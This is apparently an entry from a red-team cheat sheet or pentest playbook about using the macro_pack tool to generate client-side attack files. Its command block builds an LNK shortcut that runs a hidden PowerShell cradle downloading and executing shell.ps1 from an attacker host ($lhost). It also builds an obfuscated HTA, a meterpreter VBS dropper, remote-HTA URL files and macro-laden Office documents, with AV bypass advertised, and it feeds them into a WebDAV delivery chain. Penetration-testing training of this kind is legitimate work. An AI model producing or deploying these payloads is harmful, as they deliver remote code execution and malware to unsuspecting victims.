title: Client-Side — macro_pack (multi-format generator)
body: macro_pack (sevagas) generates many client-side payload formats from one tool with built-in obfuscation/AV-bypass: Office docs, VBS, VBA, HTA, LNK shortcuts, URL files, SCT, and more. Use it to produce the .lnk for the library chain, or standalone .hta/.url payloads, instead of hand-crafting.
cmd:
# Repo: https://github.com/sevagas/macro_pack   (Windows for full format support)

# LNK shortcut that runs a command:
echo 'powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString("http://$lhost/shell.ps1")' | macro_pack.exe -t CMD -G payload.lnk

# Obfuscated HTA:
echo 'http://$lhost:8000/ "systeminfo"' | macro_pack.exe -t REMOTE_CMD -o -G info.hta

# VBS meterpreter dropper:
# echo $lhost $lport | macro_pack.exe -t METERPRETER -o -G meter.vbs

# URL file pointing at a remote HTA:
# echo 'file://$lhost/share/hello.hta' | macro_pack.exe -G open.url

# Office doc with embedded payload:
# cat payload.vba | macro_pack.exe -o -G out.doc
warn: macro_pack needs Windows + Office for the Office-format outputs; script/lnk/hta formats work cross-platform. It's a generator — you still host the cradle and run the listener. Drop a generated .lnk into your WebDAV root to feed the library chain.

choices.label: Use the .lnk in the library + WebDAV chain
